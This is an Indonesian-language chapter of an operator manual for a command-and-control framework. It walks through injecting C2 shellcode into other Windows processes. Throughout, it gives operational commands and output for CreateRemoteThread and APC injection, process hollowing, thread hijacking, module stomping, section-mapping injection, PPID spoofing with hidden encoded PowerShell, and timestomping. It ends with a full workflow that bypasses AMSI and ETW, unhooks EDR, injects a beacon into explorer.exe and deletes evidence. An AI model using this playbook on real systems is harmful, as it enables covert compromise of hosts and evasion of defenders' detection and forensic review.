# 10 — Process Injection

> Process injection adalah teknik memasukkan dan mengeksekusi shellcode di dalam proses lain
> yang sudah berjalan. Tujuannya: stealth (jalan dalam proses legitimate), privilege escalation
> (jika proses target punya privilege lebih tinggi), dan defense evasion (EDR melihat aktivitas
> dari proses yang trusted).

---

## Konsep Dasar

```
TANPA INJECTION                      DENGAN INJECTION
─────────────────────────────────────────────────────────────────────────

agent.exe (PID 4512)                explorer.exe (PID 3048)
  └─ shellcode ada di sini    vs      └─ shellcode ada di sini
  ↑ proses asing, mudah flagged        ↑ proses legitimate, sulit flagged
```

**Semua teknik injection membutuhkan shellcode (`.bin`), bukan EXE.**
EXE yang di-inject tidak akan berjalan dengan benar karena PE loader tidak aktif.

---

## Persiapan: Generate Shellcode

Sebelum menggunakan perintah inject, siapkan shellcode terlebih dahulu:

```bash
# Opsi 1: Generate shellcode stageless dari agent yang sudah di-build
go run ./cmd/generate stager \
  --server https://c2.yourdomain.com \
  --token TOKEN \
  --key EnterpriseC2Key2026 \
  --format shellcode \
  --output payload.bin
```

**Output:**
```
[+] Generating shellcode stager...
    Server : https://c2.yourdomain.com
    Token  : 6a69a21a750af40e...
    Format : shellcode
[+] Shellcode written: payload.bin (45,056 bytes)
```

```bash
# Opsi 2: Konversi EXE ke shellcode dengan donut (tool terpisah)
donut \
  -i bin/agent_windows_stealth.exe \
  -o payload.bin \
  -a 2 \    # x64
  -e 3      # encrypt + compress
```

```
[+] Donut: payload.bin (48,384 bytes)
```

```bash
# Upload shellcode ke agent target
files upload 2703886d ./payload.bin "C:\Windows\Temp\payload.bin" --wait
```

```
[+] Uploading payload.bin (45,056 bytes)...
[+] Upload complete: C:\Windows\Temp\payload.bin
```

---

## Lihat Proses yang Berjalan (Pilih Target)

Sebelum inject, selalu lihat daftar proses untuk memilih target yang tepat:

```
taburtuai(c2.yourdomain.com:443) › process list 2703886d --wait
```

**Output:**
```
[+] Process list on DESKTOP-QLPBF95 (CORP\john.doe):

PID    PPID   NAME                     USER                  ARCH   INTEGRITY
─────────────────────────────────────────────────────────────────────────────────
4      0      System                   NT AUTHORITY\SYSTEM   x64    System
724    4      lsass.exe                NT AUTHORITY\SYSTEM   x64    System    ← SYSTEM token
1284   724    MsMpEng.exe              NT AUTHORITY\SYSTEM   x64    System
3048   1220   explorer.exe             CORP\john.doe         x64    Medium    ← user context
4108   3048   chrome.exe               CORP\john.doe         x64    Low
5824   3048   powershell.exe           CORP\john.doe         x64    Medium
6720   3048   cmd.exe                  CORP\john.doe         x64    Medium
7832   724    svchost.exe              NT AUTHORITY\SYSTEM   x64    System    ← SYSTEM context
8840   724    spoolsv.exe              NT AUTHORITY\SYSTEM   x64    System
```

**Proses yang direkomendasikan sebagai injection target:**

| Proses | PID | Kenapa Bagus |
|--------|-----|--------------|
| `explorer.exe` | 3048 | Selalu ada, user context, stabil |
| `RuntimeBroker.exe` | — | Trusted Microsoft process |
| `spoolsv.exe` | 8840 | SYSTEM context, selalu running |
| `svchost.exe` | 7832 | Banyak instance, susah dianalisis |
| `chrome.exe` | 4108 | Long-lived, network access |

---

## Inject Remote — Ke Proses Lain

### Classic Remote Thread Injection (CRT)

Cara kerja:
1. `OpenProcess` — buka handle ke proses target
2. `VirtualAllocEx` — alokasi memori di proses target
3. `WriteProcessMemory` — tulis shellcode ke memori target
4. `CreateRemoteThread` — buat thread baru untuk eksekusi

```
taburtuai(c2.yourdomain.com:443) › inject remote 2703886d \
  --pid 3048 \
  --file "C:\Windows\Temp\payload.bin" \
  --wait
```

**Output:**
```
[*] Injecting C:\Windows\Temp\payload.bin (45,056 bytes) into PID 3048 (explorer.exe)...
[*] Method  : Classic Remote Thread (CreateRemoteThread)
[*] VirtualAllocEx: 0x000001F823C40000 (RWX → RX after write)
[*] WriteProcessMemory: 45,056 bytes written
[*] CreateRemoteThread: TID 9124 created
[+] Injection completed. Shellcode executing in explorer.exe (PID 3048).
```

### APC Injection (Lebih Stealth dari CRT)

APC (Asynchronous Procedure Call) — shellcode di-queue ke thread yang sudah ada,
bukan membuat thread baru.

```
taburtuai(c2.yourdomain.com:443) › inject remote 2703886d \
  --pid 3048 \
  --file "C:\Windows\Temp\payload.bin" \
  --method apc \
  --wait
```

**Output:**
```
[*] Injecting via APC into PID 3048 (explorer.exe)...
[*] Method  : Asynchronous Procedure Call (QueueUserAPC)
[*] Scanning for alertable threads in PID 3048...
[*] Found alertable thread TID 4096
[*] VirtualAllocEx: 0x000001F823C40000
[*] WriteProcessMemory: 45,056 bytes written
[*] QueueUserAPC: APC queued to TID 4096
[+] APC queued. Shellcode will execute when thread enters alertable wait state.
```

**Mengapa APC lebih stealth dari CRT:**
- Tidak membuat thread baru (tidak ada `CreateRemoteThread` event)
- Shellcode jalan dalam konteks thread yang sudah ada
- EDR yang monitor `CreateRemoteThread` tidak akan trigger

---

## Inject Self — Di Agent Process Sendiri

Eksekusi shellcode dalam proses agent sendiri — tidak ada injection ke proses lain.

```
taburtuai(c2.yourdomain.com:443) › inject self 2703886d \
  --file "C:\Windows\Temp\payload.bin" \
  --wait
```

**Output:**
```
[*] Executing shellcode in-process (PID 4512 / agent.exe)...
[*] VirtualAlloc: 0x00007FF812340000 (RX)
[*] Shellcode size: 45,056 bytes
[+] Shellcode executed in-process.
```

**Kapan pakai:**
- Testing shellcode sebelum inject ke proses lain
- Situasi di mana tidak ada proses yang cocok untuk di-inject
- Shellcode yang butuh environment yang sama dengan agent

---

## Timestomp (Manipulasi Timestamp File)

Ubah timestamps file agar tidak terlihat baru di-drop. Berguna setelah upload
file payload agar tidak muncul di forensic timeline.

```
taburtuai(c2.yourdomain.com:443) › inject timestomp 2703886d \
  --file "C:\Windows\Temp\payload.bin" \
  --ref "C:\Windows\System32\ntdll.dll" \
  --wait
```

**Output:**
```
[*] Timestomping: C:\Windows\Temp\payload.bin
[*] Reference file: C:\Windows\System32\ntdll.dll

    Attribute       Before                        After
    ─────────────────────────────────────────────────────────
    Created         2026-04-23 09:15:32 UTC       2023-08-10 12:03:27 UTC
    Modified        2026-04-23 09:15:32 UTC       2023-08-10 12:03:27 UTC
    Accessed        2026-04-23 09:15:33 UTC       2023-08-10 12:03:27 UTC
    MFT Change      2026-04-23 09:15:32 UTC       2023-08-10 12:03:27 UTC

[+] Timestamps copied from reference. File appears old.
```

Sekarang file `payload.bin` memiliki timestamp yang sama dengan `ntdll.dll` — muncul
seolah-olah sudah ada sejak Agustus 2023.

---

## PPID Spoofing — Spawn Proses dengan Parent Palsu

Buat proses baru dengan **parent process yang berbeda** dari yang sebenarnya.
Berguna untuk membuat process chain terlihat legitimate di event log.

### Tanpa vs Dengan PPID Spoofing

```
TANPA PPID SPOOFING:                     DENGAN PPID SPOOFING:
────────────────────                     ──────────────────────────────
agent.exe (PID 4512)                     explorer.exe (PID 3048)
  └─► cmd.exe (PID 6720)                   └─► cmd.exe (PID 6720)

  ↑ Mencurigakan — cmd lahir               ↑ Normal — cmd lahir dari
  dari proses agent yang asing              explorer seperti biasa
```

### Spawn dengan Parent explorer.exe

```
taburtuai(c2.yourdomain.com:443) › inject ppid 2703886d \
  "C:\Windows\System32\cmd.exe" \
  --ppid-name explorer.exe \
  --wait
```

**Output:**
```
[*] PPID Spoofing: spawning cmd.exe with parent explorer.exe (PID 3048)
[*] Opening handle to parent: explorer.exe (PID 3048)
[*] Creating process with inherited parent token...
[+] Process created: cmd.exe (PID 7284)
[i] Process tree will show: explorer.exe → cmd.exe
[i] Verify: Sysmon Event ID 1 akan catat PPID sebagai 3048, bukan 4512
```

### Spawn PowerShell dengan Parent svchost.exe

```
taburtuai(c2.yourdomain.com:443) › inject ppid 2703886d \
  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
  --ppid-name svchost.exe \
  --args "-w hidden -ep bypass -enc BASE64PAYLOAD" \
  --wait
```

**Output:**
```
[*] PPID Spoofing: spawning powershell.exe with parent svchost.exe (PID 7832)
[*] Arguments: -w hidden -ep bypass -enc BASE64PAYLOAD
[+] Process created: powershell.exe (PID 9240)
[i] Process tree: svchost.exe → powershell.exe (terlihat normal)
```

### Spawn via PID Langsung

```
taburtuai(c2.yourdomain.com:443) › inject ppid 2703886d \
  "C:\Windows\System32\calc.exe" \
  --ppid 3048 \
  --wait
```

**Output:**
```
[*] PPID Spoofing: spawning calc.exe with parent PID 3048
[+] Process created: calc.exe (PID 5512)
```

---

## Process Hollowing

Buat proses legitimate dalam keadaan suspended, hapus kode aslinya, ganti dengan
payload kita, resume. Proses terlihat legitimate karena nama dan path-nya asli.

### Auto-Deteksi: PE vs Shellcode

Agent secara otomatis mendeteksi jenis payload dari 2 byte pertama:

| Magic bytes | Format | Teknik yang dipakai |
|-------------|--------|---------------------|
| `4D 5A` (`MZ`) | Full PE/EXE | **True PE Hollowing** — NtUnmapViewOfSection + relokasi + PEB patch |
| Byte lain | Raw shellcode | **Shellcode RIP-redirect** — VirtualAllocEx + SetThreadContext(RIP) |

Kamu tidak perlu memilih — cukup berikan file yang benar.

---

### True PE Hollowing (payload = file EXE)

Teknik yang paling stealth: agent menjalankan **EXE asli** di dalam proses host tanpa
menulis ke disk. Langkah internal:

1. Parse PE headers dari payload (ImageBase, SizeOfImage, EntryPoint, relokasi)
2. `CreateProcess(svchost.exe, SUSPENDED)` — buat proses host
3. `NtQueryInformationProcess` → baca `PebBaseAddress`
4. `ReadProcessMemory(PEB+0x10)` → baca `ImageBaseAddress` proses host
5. `NtUnmapViewOfSection` → hapus kode original proses host
6. `VirtualAllocEx` @ preferred ImageBase (fallback: anywhere)
7. Copy PE headers + sections ke staging buffer lokal
8. Apply base relocations jika `allocBase ≠ imageBase` (patch semua pointer 64-bit)
9. `WriteProcessMemory` → tulis staging buffer ke proses remote
10. Patch `PEB.ImageBaseAddress` → remote proses tahu di mana dirinya berada
11. `SetThreadContext(RIP = allocBase + EntryPointRVA)` → arahkan eksekusi
12. `ResumeThread` → jalankan

```
taburtuai(c2.yourdomain.com:443) › hollow 2703886d \
  --file "C:\Windows\Temp\agent.exe" \
  --wait
```

**Output (payload = EXE, true PE hollow):**
```
[*] Process Hollowing...
[*] Payload type: PE (MZ signature) → true PE hollowing
[*] Spawning C:\Windows\System32\svchost.exe (suspended)
    PID: 9872
[*] NtQueryInformationProcess → PebBaseAddress: 0x000000003F200000
[*] Remote ImageBase (from PEB+0x10): 0x00007FF800000000
[*] NtUnmapViewOfSection → original image unmapped
[*] VirtualAllocEx @ 0x0000000140000000 (preferred ImageBase)
[*] Staging: copying headers + 5 sections (total 294,912 bytes)
[*] Base relocations: delta=0x00000000, no patch needed
[*] WriteProcessMemory → 294,912 bytes written
[*] PEB.ImageBaseAddress patched → 0x0000000140000000
[*] SetThreadContext(RIP = 0x000000014001A000)
[*] ResumeThread...
[+] PE hollow completed. EXE running inside svchost.exe (PID 9872).

    Process Tree:
    services.exe (PID 724)
      └─► svchost.exe (PID 9872)  ← EXE kamu jalan di sini
```

**Kapan pakai True PE Hollow:**
- Payload adalah full EXE (agent baru, lateral movement tool, dsb.)
- Ingin proses terlihat seperti svchost/notepad dari semua sisi (memory, PEB, name)
- EDR yang inspect process image base akan melihat nilai yang konsisten

---

### Shellcode Hollow (payload = .bin)

Payload shellcode raw — tidak ada PE parsing, hanya VirtualAllocEx + RIP redirect.
Lebih sederhana, cukup untuk shellcode standalone.

```
taburtuai(c2.yourdomain.com:443) › hollow 2703886d \
  --file "C:\Windows\Temp\payload.bin" \
  --wait
```

**Output (payload = shellcode):**
```
[*] Process Hollowing...
[*] Payload type: shellcode (no MZ) → RIP redirect
[*] Spawning C:\Windows\System32\svchost.exe (suspended)
    PID: 9872
[*] VirtualAllocEx: 0x000001F823C40000 (RWX, 45,056 bytes)
[*] WriteProcessMemory: 45,056 bytes
[*] SetThreadContext(RIP = 0x000001F823C40000)
[*] ResumeThread...
[+] Shellcode hollow completed. Running inside svchost.exe (PID 9872).
```

---

### Hollow ke Target EXE Tertentu

```
# Hollow ke notepad.exe (EXE payload)
hollow 2703886d \
  --file "C:\Windows\Temp\agent.exe" \
  --exe notepad.exe \
  --wait
```

**Output:**
```
[*] Spawning C:\Windows\System32\notepad.exe (suspended)  PID: 10104
[*] Payload type: PE → true PE hollowing
[*] Hollowing and resuming...
[+] PE hollow completed. Running inside notepad.exe (PID 10104).
```

```
# Hollow ke RuntimeBroker.exe (trusted, selalu jalan di Windows 10+)
hollow 2703886d \
  --file "C:\Windows\Temp\agent.exe" \
  --exe RuntimeBroker.exe \
  --wait
```

---

## Thread Hijacking

Suspend thread yang berjalan di proses target, ubah instruction pointer (RIP) ke
shellcode, resume. Sangat stealth — tidak ada thread baru yang dibuat sama sekali.

```
taburtuai(c2.yourdomain.com:443) › hijack 2703886d \
  --pid 3048 \
  --file "C:\Windows\Temp\payload.bin" \
  --wait
```

**Output:**
```
[*] Thread Hijacking target: PID 3048 (explorer.exe)
[*] Enumerating threads in PID 3048...
    Found 12 threads. Targeting TID 4096 (state: waiting)
[*] Suspending TID 4096...
[*] Getting thread context (CONTEXT_FULL)...
[*] Writing shellcode to process memory: 0x000001F823C40000
[*] Redirecting RIP: 0x00007FFD3A2B1234 → 0x000001F823C40000
[*] Setting thread context...
[*] Resuming TID 4096...
[+] Thread hijacked. Shellcode executing via TID 4096 in explorer.exe.

    No new thread created.
    No CreateRemoteThread event.
    EDR sees: existing thread in explorer.exe resumed.
```

---

## Module Stomping

Timpa kode legitimate sebuah DLL yang sudah di-load di proses target dengan shellcode.
DLL masih terlihat ter-load dengan normal, tapi isinya sudah diganti.

```
taburtuai(c2.yourdomain.com:443) › stomp 2703886d \
  --file "C:\Windows\Temp\payload.bin" \
  --dll xpsservices.dll \
  --wait
```

**Output:**
```
[*] Module Stomping target: xpsservices.dll in PID 4512 (agent process)
[*] Locating xpsservices.dll in process memory...
[*] Module base address: 0x00007FFD1A340000
[*] .text section offset: 0x1000, size: 49,152 bytes
[*] Removing write protection (VirtualProtect: RX → RWX)...
[*] Writing shellcode (45,056 bytes) to .text section...
[*] Restoring memory protection (RWX → RX)...
[*] Executing shellcode at module base + 0x1000...
[+] Module stomping completed.

[i] Memory map entry still shows xpsservices.dll loaded at 0x00007FFD1A340000
[i] Scanner melihat DLL legitimate, bukan shellcode standalone.
```

**DLL yang baik untuk di-stomp (jarang dipakai, selalu ada):**

| DLL | Fungsi | Kenapa Bagus |
|-----|--------|--------------|
| `xpsservices.dll` | XPS document services | Jarang dipakai |
| `clbcatq.dll` | COM+ catalog | Biasanya tidak aktif |
| `wbem\wmiutils.dll` | WMI utilities | Background only |
| `msxml3.dll` | XML parser | Jarang diinvoke langsung |

---

## Section Mapping Injection

Inject shellcode menggunakan Windows Section objects (shared memory). Tidak menggunakan
`WriteProcessMemory` sama sekali — lebih sulit dideteksi oleh EDR yang hook API ini.

```
# Inject ke proses agent sendiri (local section mapping)
taburtuai(c2.yourdomain.com:443) › mapinject 2703886d \
  --file "C:\Windows\Temp\payload.bin" \
  --wait
```

**Output:**
```
[*] Section Mapping Injection (local)...
[*] Creating Section object (NtCreateSection)...
[*] Mapping view in local process (NtMapViewOfSection)...
[*] Writing shellcode to mapped view...
[*] Unmapping local view...
[*] Executing shellcode via mapped section...
[+] Section mapping injection completed. No WriteProcessMemory used.
```

```
# Inject ke proses lain via section mapping (remote)
mapinject 2703886d \
  --file "C:\Windows\Temp\payload.bin" \
  --pid 3048 \
  --wait
```

**Output:**
```
[*] Section Mapping Injection (remote) → PID 3048 (explorer.exe)...
[*] NtCreateSection → Section object created
[*] NtMapViewOfSection (local) → 0x000001F823C40000
[*] Writing shellcode...
[*] NtMapViewOfSection (remote PID 3048) → 0x0000021F44A00000
[*] NtUnmapViewOfSection (local)...
[*] QueueUserAPC → execution triggered in PID 3048
[+] Remote section mapping injection completed.
    No WriteProcessMemory. No CreateRemoteThread.
```

---

## Perbandingan Semua Teknik Injection

| Teknik | API Utama | Thread Baru | WriteProcessMemory | Deteksi Kesulitan |
|--------|-----------|-------------|-------------------|-------------------|
| CRT (Classic) | CreateRemoteThread | Ya | Ya | Rendah — flagged di hampir semua EDR |
| APC | QueueUserAPC | Tidak | Ya | Sedang |
| Thread Hijacking | SuspendThread + SetContext | Tidak | Ya | Tinggi |
| Process Hollowing | NtUnmapViewOfSection | Tidak | Ya | Tinggi |
| Module Stomping | VirtualProtect | Tidak | Tidak | Tinggi |
| Section Mapping | NtCreateSection + NtMapViewOfSection | Tidak | Tidak | Sangat Tinggi |

---

## Workflow Lengkap: Inject ke Explorer

```bash
# ── Langkah 1: Generate shellcode ────────────────────────────────────
go run ./cmd/generate stager \
  --server https://c2.yourdomain.com \
  --token TOKEN --key KEY \
  --format shellcode --output payload.bin

# ── Langkah 2: Upload ke target ──────────────────────────────────────
files upload 2703886d ./payload.bin "C:\Windows\Temp\p.bin" --wait

# ── Langkah 3: Timestomp agar tidak terlihat baru ────────────────────
inject timestomp 2703886d \
  --file "C:\Windows\Temp\p.bin" \
  --ref "C:\Windows\System32\ntdll.dll" \
  --wait

# ── Langkah 4: Bypass AMSI+ETW+Unhook dulu ───────────────────────────
bypass amsi   2703886d --wait
bypass etw    2703886d --wait
evasion unhook 2703886d --wait

# ── Langkah 5: Inject via APC ke explorer.exe ────────────────────────
inject remote 2703886d \
  --pid 3048 \
  --file "C:\Windows\Temp\p.bin" \
  --method apc \
  --wait

# ── Langkah 6: Cleanup shellcode dari disk ───────────────────────────
files delete 2703886d "C:\Windows\Temp\p.bin" --wait

# ── Langkah 7: Verify agent baru muncul ──────────────────────────────
agents list
# ID        HOST              USER           STATUS
# 2703886d  DESKTOP-QLPBF95  john.doe       online  ← agent lama
# f3a1b2c4  DESKTOP-QLPBF95  john.doe       online  ← agent baru di explorer.exe
```

---

**Selanjutnya:** [11 — Evasion](11-evasion.md)
